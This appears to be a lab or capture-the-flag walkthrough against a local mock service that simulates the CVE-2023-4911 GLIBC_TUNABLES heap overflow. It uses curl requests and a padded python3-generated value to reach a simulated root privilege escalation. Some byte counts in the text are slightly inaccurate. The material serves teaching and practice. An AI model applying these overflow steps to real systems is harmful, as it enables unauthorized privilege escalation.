# Finding the Bug

## Checking the Service

Probe the service info endpoint to confirm the glibc version and buffer size:

```bash
curl http://localhost:8080/info
```

Output:
```json
{
  "glibc_version": "2.38",
  "buffer_size": 256,
  "overflow_trigger": "value starting with 'glibc.malloc.mxfast=' longer than 256 bytes",
  "note": "CVE-2023-4911: GLIBC_TUNABLES heap buffer overflow"
}
```

The buffer is 256 bytes. The `glibc.malloc.mxfast=` key is 20 bytes, leaving 236 bytes
before the overflow trigger. Any value longer than 256 bytes total overflows the buffer.

## Confirming Normal Behavior

Send a short, valid tunable value:

```bash
curl -s -X POST http://localhost:8080/run-helper \
  -H "Content-Type: application/json" \
  -d '{"glibc_tunables": "glibc.malloc.mxfast=64"}'
```

Output:
```json
{
  "exit_code": 0,
  "privilege": "user",
  "output": "uid=1000(user) gid=1000(user)",
  "note": "No overflow. Running as unprivileged user"
}
```

The helper ran as an unprivileged user. The 24-byte value fit within the 256-byte buffer.

## Triggering the Overflow

Send a 300-byte value starting with the vulnerable key:

```bash
curl -s -X POST http://localhost:8080/run-helper \
  -H "Content-Type: application/json" \
  -d "{\"glibc_tunables\": \"glibc.malloc.mxfast=$(python3 -c 'print("A"*280)')\"}"
```

Output:
```json
{
  "privilege": "root",
  "output": "uid=0(root) gid=0(root) groups=0(root)",
  "note": "Heap overflow triggered. Privilege escalation succeeded"
}
```

The heap overflow corrupted the privilege check. The process ran as root.
